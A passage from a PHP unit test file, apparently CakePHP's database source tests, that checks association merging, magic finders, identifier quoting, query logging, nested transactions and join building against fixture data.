					'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			)
		);
		$expected = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			),
			'Comment' => array(
				array(
					'id' => '1', 'comment' => 'Comment 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31',
					'User2' => array(
						'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
					)
				),
				array(
					'id' => '2', 'comment' => 'Comment 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31',
					'User2' => array(
						'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
					)
				)
			)
		);
		$this->testDb->mergeAssociation($data, $merge, 'Comment', 'hasMany');
		$this->assertEquals($expected, $data);

		$data = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			)
		);
		$merge = array(
			array(
				'Comment' => array(
					'id' => '1', 'comment' => 'Comment 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				'User2' => array(
					'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				'Tag' => array(
					array('id' => 1, 'tag' => 'Tag 1'),
					array('id' => 2, 'tag' => 'Tag 2')
				)
			),
			array(
				'Comment' => array(
					'id' => '2', 'comment' => 'Comment 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				'User2' => array(
					'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				'Tag' => array()
			)
		);
		$expected = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			),
			'Comment' => array(
				array(
					'id' => '1', 'comment' => 'Comment 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31',
					'User2' => array(
						'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
					),
					'Tag' => array(
						array('id' => 1, 'tag' => 'Tag 1'),
						array('id' => 2, 'tag' => 'Tag 2')
					)
				),
				array(
					'id' => '2', 'comment' => 'Comment 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31',
					'User2' => array(
						'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
					),
					'Tag' => array()
				)
			)
		);
		$this->testDb->mergeAssociation($data, $merge, 'Comment', 'hasMany');
		$this->assertEquals($expected, $data);

		$data = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			)
		);
		$merge = array(
			array(
				'Tag' => array(
					'id' => '1', 'tag' => 'Tag 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			),
			array(
				'Tag' => array(
					'id' => '2', 'tag' => 'Tag 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			),
			array(
				'Tag' => array(
					'id' => '3', 'tag' => 'Tag 3', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			)
		);
		$expected = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			),
			'Tag' => array(
				array(
					'id' => '1', 'tag' => 'Tag 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				array(
					'id' => '2', 'tag' => 'Tag 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				array(
					'id' => '3', 'tag' => 'Tag 3', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			)
		);
		$this->testDb->mergeAssociation($data, $merge, 'Tag', 'hasAndBelongsToMany');
		$this->assertEquals($expected, $data);

		$data = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			)
		);
		$merge = array(
			array(
				'Tag' => array(
					'id' => '1', 'tag' => 'Tag 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			),
			array(
				'Tag' => array(
					'id' => '2', 'tag' => 'Tag 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			),
			array(
				'Tag' => array(
					'id' => '3', 'tag' => 'Tag 3', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			)
		);
		$expected = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			),
			'Tag' => array('id' => '1', 'tag' => 'Tag 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31')
		);
		$this->testDb->mergeAssociation($data, $merge, 'Tag', 'hasOne');
		$this->assertEquals($expected, $data);
	}

/**
 * testMagicMethodQuerying method
 *
 * @return void
 */
	public function testMagicMethodQuerying() {
		$result = $this->db->query('findByFieldName', array('value'), $this->Model);
		$expected = array('first', array(
			'conditions' => array('TestModel.field_name' => 'value'),
			'fields' => null, 'order' => null, 'recursive' => null
		));
		$this->assertEquals($expected, $result);

		$result = $this->db->query('findByFindBy', array('value'), $this->Model);
		$expected = array('first', array(
			'conditions' => array('TestModel.find_by' => 'value'),
			'fields' => null, 'order' => null, 'recursive' => null
		));
		$this->assertEquals($expected, $result);

		$result = $this->db->query('findAllByFieldName', array('value'), $this->Model);
		$expected = array('all', array(
			'conditions' => array('TestModel.field_name' => 'value'),
			'fields' => null, 'order' => null, 'limit' => null,
			'page' => null, 'recursive' => null
		));
		$this->assertEquals($expected, $result);

		$result = $this->db->query('findAllById', array('a'), $this->Model);
		$expected = array('all', array(
			'conditions' => array('TestModel.id' => 'a'),
			'fields' => null, 'order' => null, 'limit' => null,
			'page' => null, 'recursive' => null
		));
		$this->assertEquals($expected, $result);

		$result = $this->db->query('findByFieldName', array(array('value1', 'value2', 'value3')), $this->Model);
		$expected = array('first', array(
			'conditions' => array('TestModel.field_name' => array('value1', 'value2', 'value3')),
			'fields' => null, 'order' => null, 'recursive' => null
		));
		$this->assertEquals($expected, $result);

		$result = $this->db->query('findByFieldName', array(null), $this->Model);
		$expected = array('first', array(
			'conditions' => array('TestModel.field_name' => null),
			'fields' => null, 'order' => null, 'recursive' => null
		));
		$this->assertEquals($expected, $result);

		$result = $this->db->query('findByFieldName', array('= a'), $this->Model);
		$expected = array('first', array(
			'conditions' => array('TestModel.field_name' => '= a'),
			'fields' => null, 'order' => null, 'recursive' => null
		));
		$this->assertEquals($expected, $result);

		$result = $this->db->query('findByFieldName', array(), $this->Model);
		$expected = false;
		$this->assertEquals($expected, $result);
	}

/**
 * @expectedException PDOException
 * @return void
 */
	public function testDirectCallThrowsException() {
		$this->db->query('directCall', array(), $this->Model);
	}

/**
 * testValue method
 *
 * @return void
 */
	public function testValue() {
		if ($this->db instanceof Sqlserver) {
			$this->markTestSkipped('Cannot run this test with SqlServer');
		}
		$result = $this->db->value('{$__cakeForeignKey__$}');
		$this->assertEquals('{$__cakeForeignKey__$}', $result);

		$result = $this->db->value(array('first', 2, 'third'));
		$expected = array('\'first\'', 2, '\'third\'');
		$this->assertEquals($expected, $result);
	}

/**
 * Tests if the connection can be re-established and that the new (optional) config is set.
 *
 * @return void
 */
	public function testReconnect() {
		$this->testDb->reconnect(array('prefix' => 'foo'));
		$this->assertTrue($this->testDb->connected);
		$this->assertEquals('foo', $this->testDb->config['prefix']);
	}

/**
 * testName method
 *
 * @return void
 */
	public function testName() {
		$result = $this->testDb->name('name');
		$expected = '`name`';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name(array('name', 'Model.*'));
		$expected = array('`name`', '`Model`.*');
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('MTD()');
		$expected = 'MTD()';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('(sm)');
		$expected = '(sm)';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('name AS x');
		$expected = '`name` AS `x`';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('Model.name AS x');
		$expected = '`Model`.`name` AS `x`';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('Function(Something.foo)');
		$expected = 'Function(`Something`.`foo`)';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('Function(SubFunction(Something.foo))');
		$expected = 'Function(SubFunction(`Something`.`foo`))';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('Function(Something.foo) AS x');
		$expected = 'Function(`Something`.`foo`) AS `x`';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('I18n__title__pt-br.locale');
		$expected = '`I18n__title__pt-br`.`locale`';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('name-with-minus');
		$expected = '`name-with-minus`';
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name(array('my-name', 'Foo-Model.*'));
		$expected = array('`my-name`', '`Foo-Model`.*');
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name(array('Team.P%', 'Team.G/G'));
		$expected = array('`Team`.`P%`', '`Team`.`G/G`');
		$this->assertEquals($expected, $result);

		$result = $this->testDb->name('Model.name as y');
		$expected = '`Model`.`name` AS `y`';
		$this->assertEquals($expected, $result);
	}

/**
 * test that cacheMethod works as expected
 *
 * @return void
 */
	public function testCacheMethod() {
		$this->testDb->cacheMethods = true;
		$result = $this->testDb->cacheMethod('name', 'some-key', 'stuff');
		$this->assertEquals('stuff', $result);

		$result = $this->testDb->cacheMethod('name', 'some-key');
		$this->assertEquals('stuff', $result);

		$result = $this->testDb->cacheMethod('conditions', 'some-key');
		$this->assertNull($result);

		$result = $this->testDb->cacheMethod('name', 'other-key');
		$this->assertNull($result);

		$this->testDb->cacheMethods = false;
		$result = $this->testDb->cacheMethod('name', 'some-key', 'stuff');
		$this->assertEquals('stuff', $result);

		$result = $this->testDb->cacheMethod('name', 'some-key');
		$this->assertNull($result);
	}

/**
 * Test that rare collisions do not happen with method caching
 *
 * @return void
 */
	public function testNameMethodCacheCollisions() {
		$this->testDb->cacheMethods = true;
		$this->testDb->flushMethodCache();
		$this->testDb->name('Model.fieldlbqndkezcoapfgirmjsh');
		$result = $this->testDb->name('Model.fieldkhdfjmelarbqnzsogcpi');
		$expected = '`Model`.`fieldkhdfjmelarbqnzsogcpi`';
		$this->assertEquals($expected, $result);
	}

/**
 * Test that flushMethodCache works as expected
 *
 * @return void
 */
	public function testFlushMethodCache() {
		$this->testDb->cacheMethods = true;
		$this->testDb->cacheMethod('name', 'some-key', 'stuff');

		Cache::write('method_cache', DboTestSource::$methodCache, '_cake_core_');

		$this->testDb->flushMethodCache();
		$result = $this->testDb->cacheMethod('name', 'some-key');
		$this->assertNull($result);
	}

/**
 * testLog method
 *
 * @outputBuffering enabled
 * @return void
 */
	public function testLog() {
		$this->testDb->logQuery('Query 1');
		$this->testDb->logQuery('Query 2');

		$log = $this->testDb->getLog(false, false);
		$result = Hash::extract($log['log'], '{n}.query');
		$expected = array('Query 1', 'Query 2');
		$this->assertEquals($expected, $result);

		$oldDebug = Configure::read('debug');
		Configure::write('debug', 2);
		ob_start();
		$this->testDb->showLog();
		$contents = ob_get_clean();

		$this->assertRegExp('/Query 1/s', $contents);
		$this->assertRegExp('/Query 2/s', $contents);

		ob_start();
		$this->testDb->showLog(true);
		$contents = ob_get_clean();

		$this->assertRegExp('/Query 1/s', $contents);
		$this->assertRegExp('/Query 2/s', $contents);

		Configure::write('debug', $oldDebug);
	}

/**
 * test getting the query log as an array.
 *
 * @return void
 */
	public function testGetLog() {
		$this->testDb->logQuery('Query 1');
		$this->testDb->logQuery('Query 2');

		$log = $this->testDb->getLog();
		$expected = array('query' => 'Query 1', 'params' => array(), 'affected' => '', 'numRows' => '', 'took' => '');

		$this->assertEquals($expected, $log['log'][0]);
		$expected = array('query' => 'Query 2', 'params' => array(), 'affected' => '', 'numRows' => '', 'took' => '');
		$this->assertEquals($expected, $log['log'][1]);
		$expected = array('query' => 'Error 1', 'affected' => '', 'numRows' => '', 'took' => '');
	}

/**
 * test getting the query log as an array, setting bind params.
 *
 * @return void
 */
	public function testGetLogParams() {
		$this->testDb->logQuery('Query 1', array(1, 2, 'abc'));
		$this->testDb->logQuery('Query 2', array('field1' => 1, 'field2' => 'abc'));

		$log = $this->testDb->getLog();
		$expected = array('query' => 'Query 1', 'params' => array(1, 2, 'abc'), 'affected' => '', 'numRows' => '', 'took' => '');
		$this->assertEquals($expected, $log['log'][0]);
		$expected = array('query' => 'Query 2', 'params' => array('field1' => 1, 'field2' => 'abc'), 'affected' => '', 'numRows' => '', 'took' => '');
		$this->assertEquals($expected, $log['log'][1]);
	}

/**
 * test that query() returns boolean values from operations like CREATE TABLE
 *
 * @return void
 */
	public function testFetchAllBooleanReturns() {
		$name = $this->db->fullTableName('test_query');
		$query = "CREATE TABLE {$name} (name varchar(10));";
		$result = $this->db->query($query);
		$this->assertTrue($result, 'Query did not return a boolean');

		$query = "DROP TABLE {$name};";
		$result = $this->db->query($query);
		$this->assertTrue($result, 'Query did not return a boolean');
	}

/**
 * test order to generate query order clause for virtual fields
 *
 * @return void
 */
	public function testVirtualFieldsInOrder() {
		$Article = ClassRegistry::init('Article');
		$Article->virtualFields = array(
			'this_moment' => 'NOW()',
			'two' => '1 + 1',
		);
		$order = array('two', 'this_moment');
		$result = $this->db->order($order, 'ASC', $Article);
		$expected = ' ORDER BY (1 + 1) ASC, (NOW()) ASC';
		$this->assertEquals($expected, $result);

		$order = array('Article.two', 'Article.this_moment');
		$result = $this->db->order($order, 'ASC', $Article);
		$expected = ' ORDER BY (1 + 1) ASC, (NOW()) ASC';
		$this->assertEquals($expected, $result);
	}

/**
 * test the permutations of fullTableName()
 *
 * @return void
 */
	public function testFullTablePermutations() {
		$Article = ClassRegistry::init('Article');
		$result = $this->testDb->fullTableName($Article, false, false);
		$this->assertEquals('articles', $result);

		$Article->tablePrefix = 'tbl_';
		$result = $this->testDb->fullTableName($Article, false, false);
		$this->assertEquals('tbl_articles', $result);

		$Article->useTable = $Article->table = 'with spaces';
		$Article->tablePrefix = '';
		$result = $this->testDb->fullTableName($Article, true, false);
		$this->assertEquals('`with spaces`', $result);

		$this->loadFixtures('Article');
		$Article->useTable = $Article->table = 'articles';
		$Article->setDataSource('test');
		$testdb = $Article->getDataSource();
		$result = $testdb->fullTableName($Article, false, true);
		$this->assertEquals($testdb->getSchemaName() . '.articles', $result);

		// tests for empty schemaName
		$noschema = ConnectionManager::create('noschema', array(
			'datasource' => 'DboTestSource'
			));
		$Article->setDataSource('noschema');
		$Article->schemaName = null;
		$result = $noschema->fullTableName($Article, false, true);
		$this->assertEquals('articles', $result);

		$this->testDb->config['prefix'] = 't_';
		$result = $this->testDb->fullTableName('post_tag', false, false);
		$this->assertEquals('t_post_tag', $result);
	}

/**
 * test that read() only calls queryAssociation on db objects when the method is defined.
 *
 * @return void
 */
	public function testReadOnlyCallingQueryAssociationWhenDefined() {
		$this->loadFixtures('Article', 'User', 'ArticlesTag', 'Tag');
		ConnectionManager::create('test_no_queryAssociation', array(
			'datasource' => 'MockDataSource'
		));
		$Article = ClassRegistry::init('Article');
		$Article->Comment->useDbConfig = 'test_no_queryAssociation';
		$result = $Article->find('all');
		$this->assertTrue(is_array($result));
	}

/**
 * test that queryAssociation() reuse already joined data for 'belongsTo' and 'hasOne' associations
 * instead of running unneeded queries for each record
 *
 * @return void
 */
	public function testQueryAssociationUnneededQueries() {
		$this->loadFixtures('Article', 'User', 'Comment', 'Attachment', 'Tag', 'ArticlesTag');
		$Comment = ClassRegistry::init('Comment');

		$fullDebug = $this->db->fullDebug;
		$this->db->fullDebug = true;

		$Comment->find('all', array('recursive' => 2)); // ensure Model descriptions are saved
		$this->db->getLog();

		// case: Comment belongsTo User and Article
		$Comment->unbindModel(array(
			'hasOne' => array('Attachment')
		));
		$Comment->Article->unbindModel(array(
			'belongsTo' => array('User'),
			'hasMany' => array('Comment'),
			'hasAndBelongsToMany' => array('Tag')
		));
		$Comment->find('all', array('recursive' => 2));
		$log = $this->db->getLog();
		$this->assertEquals(1, count($log['log']));

		// case: Comment belongsTo Article, Article belongsTo User
		$Comment->unbindModel(array(
			'belongsTo' => array('User'),
			'hasOne' => array('Attachment')
		));
		$Comment->Article->unbindModel(array(
			'hasMany' => array('Comment'),
			'hasAndBelongsToMany' => array('Tag'),
		));
		$Comment->find('all', array('recursive' => 2));
		$log = $this->db->getLog();
		$this->assertEquals(7, count($log['log']));

		// case: Comment hasOne Attachment
		$Comment->unbindModel(array(
			'belongsTo' => array('Article', 'User'),
		));
		$Comment->Attachment->unbindModel(array(
			'belongsTo' => array('Comment'),
		));
		$Comment->find('all', array('recursive' => 2));
		$log = $this->db->getLog();
		$this->assertEquals(1, count($log['log']));

		$this->db->fullDebug = $fullDebug;
	}

/**
 * Tests that generation association queries without LinkModel still works.
 * Mainly BC.
 *
 * @return void
 */
	public function testGenerateAssociationQuery() {
		$this->loadFixtures('Article');
		$Article = ClassRegistry::init('Article');

		$queryData = array(
			'conditions' => array(
				'Article.id' => 1
			),
			'fields' => array(
				'Article.id',
				'Article.title',
			),
			'joins' => array(),
			'limit' => 2,
			'offset' => 2,
			'order' => array('title'),
			'page' => 2,
			'group' => null,
			'callbacks' => 1
		);

		$result = $this->db->generateAssociationQuery($Article, null, null, null, null, $queryData, false);
		$this->assertContains('SELECT', $result);
		$this->assertContains('FROM', $result);
		$this->assertContains('WHERE', $result);
		$this->assertContains('ORDER', $result);
	}

/**
 * test that fields() is using methodCache()
 *
 * @return void
 */
	public function testFieldsUsingMethodCache() {
		$this->testDb->cacheMethods = false;
		DboTestSource::$methodCache = array();

		$Article = ClassRegistry::init('Article');
		$this->testDb->fields($Article, null, array('title', 'body', 'published'));
		$this->assertTrue(empty(DboTestSource::$methodCache['fields']), 'Cache not empty');
	}

/**
 * test that fields() method cache detects datasource changes
 *
 * @return void
 */
	public function testFieldsCacheKeyWithDatasourceChange() {
		ConnectionManager::create('firstschema', array(
			'datasource' => 'DboTestSource'
		));
		ConnectionManager::create('secondschema', array(
			'datasource' => 'DboSecondTestSource'
		));
		Cache::delete('method_cache', '_cake_core_');
		DboTestSource::$methodCache = array();
		$Article = ClassRegistry::init('Article');

		$Article->setDataSource('firstschema');
		$ds = $Article->getDataSource();
		$ds->cacheMethods = true;
		$first = $ds->fields($Article, null, array('title', 'body', 'published'));

		$Article->setDataSource('secondschema');
		$ds = $Article->getDataSource();
		$ds->cacheMethods = true;
		$second = $ds->fields($Article, null, array('title', 'body', 'published'));

		$this->assertNotEquals($first, $second);
		$this->assertEquals(2, count(DboTestSource::$methodCache['fields']));
	}

/**
 * test that fields() method cache detects schema name changes
 *
 * @return void
 */
	public function testFieldsCacheKeyWithSchemanameChange() {
		if ($this->db instanceof Postgres || $this->db instanceof Sqlserver) {
			$this->markTestSkipped('Cannot run this test with SqlServer or Postgres');
		}
		Cache::delete('method_cache', '_cake_core_');
		DboSource::$methodCache = array();
		$Article = ClassRegistry::init('Article');

		$ds = $Article->getDataSource();
		$ds->cacheMethods = true;
		$first = $ds->fields($Article);

		$Article->schemaName = 'secondSchema';
		$ds = $Article->getDataSource();
		$ds->cacheMethods = true;
		$second = $ds->fields($Article);

		$this->assertEquals(2, count(DboSource::$methodCache['fields']));
	}

/**
 * Test that group works without a model
 *
 * @return void
 */
	public function testGroupNoModel() {
		$result = $this->db->group('created');
		$this->assertEquals(' GROUP BY created', $result);
	}

/**
 * Test getting the last error.
 *
 * @return void
 */
	public function testLastError() {
		$stmt = $this->getMock('PDOStatement');
		$stmt->expects($this->any())
			->method('errorInfo')
			->will($this->returnValue(array('', 'something', 'bad')));

		$result = $this->db->lastError($stmt);
		$expected = 'something: bad';
		$this->assertEquals($expected, $result);
	}

/**
 * Tests that transaction commands are logged
 *
 * @return void
 */
	public function testTransactionLogging() {
		$conn = $this->getMock('MockPDO');
		$db = new DboTestSource();
		$db->setConnection($conn);
		$conn->expects($this->exactly(2))->method('beginTransaction')
			->will($this->returnValue(true));
		$conn->expects($this->once())->method('commit')->will($this->returnValue(true));
		$conn->expects($this->once())->method('rollback')->will($this->returnValue(true));

		$db->begin();
		$log = $db->getLog();
		$expected = array('query' => 'BEGIN', 'params' => array(), 'affected' => '', 'numRows' => '', 'took' => '');
		$this->assertEquals($expected, $log['log'][0]);

		$db->commit();
		$expected = array('query' => 'COMMIT', 'params' => array(), 'affected' => '', 'numRows' => '', 'took' => '');
		$log = $db->getLog();
		$this->assertEquals($expected, $log['log'][0]);

		$db->begin();
		$expected = array('query' => 'BEGIN', 'params' => array(), 'affected' => '', 'numRows' => '', 'took' => '');
		$log = $db->getLog();
		$this->assertEquals($expected, $log['log'][0]);

		$db->rollback();
		$expected = array('query' => 'ROLLBACK', 'params' => array(), 'affected' => '', 'numRows' => '', 'took' => '');
		$log = $db->getLog();
		$this->assertEquals($expected, $log['log'][0]);
	}

/**
 * Test nested transaction calls
 *
 * @return void
 */
	public function testTransactionNested() {
		$conn = $this->getMock('MockPDO');
		$db = new DboTestSource();
		$db->setConnection($conn);
		$db->useNestedTransactions = true;
		$db->nestedSupport = true;

		$conn->expects($this->at(0))->method('beginTransaction')->will($this->returnValue(true));
		$conn->expects($this->at(1))->method('exec')->with($this->equalTo('SAVEPOINT LEVEL1'))->will($this->returnValue(true));
		$conn->expects($this->at(2))->method('exec')->with($this->equalTo('RELEASE SAVEPOINT LEVEL1'))->will($this->returnValue(true));
		$conn->expects($this->at(3))->method('exec')->with($this->equalTo('SAVEPOINT LEVEL1'))->will($this->returnValue(true));
		$conn->expects($this->at(4))->method('exec')->with($this->equalTo('ROLLBACK TO SAVEPOINT LEVEL1'))->will($this->returnValue(true));
		$conn->expects($this->at(5))->method('commit')->will($this->returnValue(true));

		$this->_runTransactions($db);
	}

/**
 * Test nested transaction calls without support
 *
 * @return void
 */
	public function testTransactionNestedWithoutSupport() {
		$conn = $this->getMock('MockPDO');
		$db = new DboTestSource();
		$db->setConnection($conn);
		$db->useNestedTransactions = true;
		$db->nestedSupport = false;

		$conn->expects($this->once())->method('beginTransaction')->will($this->returnValue(true));
		$conn->expects($this->never())->method('exec');
		$conn->expects($this->once())->method('commit')->will($this->returnValue(true));

		$this->_runTransactions($db);
	}

/**
 * Test nested transaction disabled
 *
 * @return void
 */
	public function testTransactionNestedDisabled() {
		$conn = $this->getMock('MockPDO');
		$db = new DboTestSource();
		$db->setConnection($conn);
		$db->useNestedTransactions = false;
		$db->nestedSupport = true;

		$conn->expects($this->once())->method('beginTransaction')->will($this->returnValue(true));
		$conn->expects($this->never())->method('exec');
		$conn->expects($this->once())->method('commit')->will($this->returnValue(true));

		$this->_runTransactions($db);
	}

/**
 * Nested transaction calls
 *
 * @param DboTestSource $db
 * @return void
 */
	protected function _runTransactions($db) {
		$db->begin();
		$db->begin();
		$db->commit();
		$db->begin();
		$db->rollback();
		$db->commit();
	}

/**
 * Test build statement with some fields missing
 *
 * @return void
 */
	public function testBuildStatementDefaults() {
		$conn = $this->getMock('MockPDO', array('quote'));
		$conn->expects($this->at(0))
			->method('quote')
			->will($this->returnValue('foo bar'));
		$db = new DboTestSource();
		$db->setConnection($conn);
		$subQuery = $db->buildStatement(
			array(
				'fields' => array('DISTINCT(AssetsTag.asset_id)'),
				'table' => "assets_tags",
				'alias' => "AssetsTag",
				'conditions' => array("Tag.name" => 'foo bar'),
				'limit' => null,
				'group' => "AssetsTag.asset_id"
			),
			$this->Model
		);
		$expected = 'SELECT DISTINCT(AssetsTag.asset_id) FROM assets_tags AS AssetsTag   WHERE Tag.name = foo bar  GROUP BY AssetsTag.asset_id';
		$this->assertEquals($expected, $subQuery);
	}

/**
 * data provider for testBuildJoinStatement
 *
 * @return array
 */
	public static function joinStatements() {
		return array(
			array(array(
				'type' => 'CROSS',
				'alias' => 'PostsTag',
				'table' => 'posts_tags',
				'conditions' => array('1 = 1')
			), 'CROSS JOIN cakephp.posts_tags AS PostsTag'),
			array(array(
				'type' => 'LEFT',
				'alias' => 'PostsTag',
				'table' => 'posts_tags',
			), 'LEFT JOIN cakephp.posts_tags AS PostsTag'),
			array(array(
				'type' => 'LEFT',
				'alias' => 'PostsTag',
				'table' => 'posts_tags',
				'conditions' => array('PostsTag.post_id = Post.id')
			), 'LEFT JOIN cakephp.posts_tags AS PostsTag ON (PostsTag.post_id = Post.id)'),
			array(array(
				'type' => 'LEFT',
				'alias' => 'Stock',
				'table' => '(SELECT Stock.article_id, sum(quantite) quantite FROM stocks AS Stock GROUP BY Stock.article_id)',
				'conditions' => 'Stock.article_id = Article.id'
			), 'LEFT JOIN (SELECT Stock.article_id, sum(quantite) quantite FROM stocks AS Stock GROUP BY Stock.article_id) AS Stock ON (Stock.article_id = Article.id)')
		);
	}

/**
 * Test buildJoinStatement()
 * ensure that schemaName is not added when table value is a subquery
 *
 * @dataProvider joinStatements
 * @return void
 */
	public function testBuildJoinStatement($join, $expected) {
		$db = $this->getMock('DboTestSource', array('getSchemaName'));
		$db->expects($this->any())
			->method('getSchemaName')
			->will($this->returnValue('cakephp'));
		$result = $db->buildJoinStatement($join);
		$this->assertEquals($expected, $result);
	}

/**
 * data provider for testBuildJoinStatementWithTablePrefix
 *
 * @return array
 */
	public static function joinStatementsWithPrefix($schema) {
		return array(
			array(array(
				'type' => 'LEFT',
				'alias' => 'PostsTag',
				'table' => 'posts_tags',
				'conditions' => array('PostsTag.post_id = Post.id')
			), 'LEFT JOIN pre_posts_tags AS PostsTag ON (PostsTag.post_id = Post.id)'),
				array(array(
					'type' => 'LEFT',
					'alias' => 'Stock',
					'table' => '(SELECT Stock.article_id, sum(quantite) quantite FROM stocks AS Stock GROUP BY Stock.article_id)',
					'conditions' => 'Stock.article_id = Article.id'
				), 'LEFT JOIN (SELECT Stock.article_id, sum(quantite) quantite FROM stocks AS Stock GROUP BY Stock.article_id) AS Stock ON (Stock.article_id = Article.id)')
			);
	}

/**
 * Test buildJoinStatement()
 * ensure that prefix is not added when table value is a subquery
 *
 * @dataProvider joinStatementsWithPrefix
 * @return void
 */
	public function testBuildJoinStatementWithTablePrefix($join, $expected) {
		$db = new DboTestSource();
		$db->config['prefix'] = 'pre_';
		$result = $db->buildJoinStatement($join);
		$this->assertEquals($expected, $result);
	}

/**
 * Test conditionKeysToString()
 *
 * @return void
 */
	public function testConditionKeysToString() {
		$Article = ClassRegistry::init('Article');
		$conn = $this->getMock('MockPDO', array('quote'));
		$db = new DboTestSource();
		$db->setConnection($conn);

		$conn->expects($this->at(0))
			->method('quote')
			->will($this->returnValue('just text'));

		$conditions = array('Article.name' => 'just text');
		$result = $db->conditionKeysToString($conditions, true, $Article);
		$expected = "Article.name = just text";
		$this->assertEquals($expected, $result[0]);

		$conn->expects($this->at(0))
			->method('quote')
			->will($this->returnValue('just text'));
		$conn->expects($this->at(1))
			->method('quote')
			->will($this->returnValue('other text'));

		$conditions = array('Article.name' => array('just text', 'other text'));
		$result = $db->conditionKeysToString($conditions, true, $Article);
		$expected = "Article.name IN (just text, other text)";
		$this->assertEquals($expected, $result[0]);
	}

/**
 * Test conditionKeysToString() with virtual field
 *
 * @return void
 */
	public function testConditionKeysToStringVirtualField() {
		$Article = ClassRegistry::init('Article');
		$Article->virtualFields = array(
			'extra' => 'something virtual'
		);
		$conn = $this->getMock('MockPDO', array('quote'));
		$db = new DboTestSource();
		$db->setConnection($conn);

		$conn->expects($this->at(0))
			->method('quote')
			->will($this->returnValue('just text'));

		$conditions = array('Article.extra' => 'just text');
		$result = $db->conditionKeysToString($conditions, true, $Article);
		$expected = "(" . $Article->virtualFields['extra'] . ") = just text";
		$this->assertEquals($expected, $result[0]);

		$conn->expects($this->at(0))
			->method('quote')
			->will($this->returnValue('just text'));
		$conn->expects($this->at(1))
			->method('quote')
			->will($this->returnValue('other text'));

		$conditions = array('Article.extra' => array('just text', 'other text'));
		$result = $db->conditionKeysToString($conditions, true, $Article);
		$expected = "(" . $Article->virtualFields['extra'] . ") IN (just text, other text)";
		$this->assertEquals($expected, $result[0]);
	}

/**
 * Test the limit function.
 *
 * @return void
 */
	public function testLimit() {
		$db = new DboTestSource();

		$result = $db->limit('0');
		$this->assertNull($result);

		$result = $db->limit('10');
		$this->assertEquals(' LIMIT 10', $result);

